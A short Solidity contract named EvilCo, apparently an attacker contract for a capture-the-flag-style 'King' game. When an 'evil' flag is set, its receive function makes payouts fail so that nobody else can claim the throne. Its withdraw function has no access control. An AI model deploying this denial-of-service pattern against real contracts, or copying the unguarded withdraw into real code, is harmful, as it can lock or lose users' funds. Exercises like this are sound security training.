/**
 *Submitted for verification at Etherscan.io on 2022-05-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract EvilCo {
    bool evil;
    address payable public kingContract;
    uint prize = 1000000000000001;

    constructor() public payable {
        evil = false;
    }

    function setKingContract(address payable _kingContract) public {
        kingContract = _kingContract;
    }

    function setEvil(bool _evil) public {
        evil = _evil;
    }

    function becomeKing() public payable {
        kingContract.transfer(prize);
        prize += 1;
    }

    function withdraw(uint amount) public {
        msg.sender.transfer(amount);
    }

    receive() external payable {
        if(evil) {
            kingContract.transfer(prize);
        }
    }
}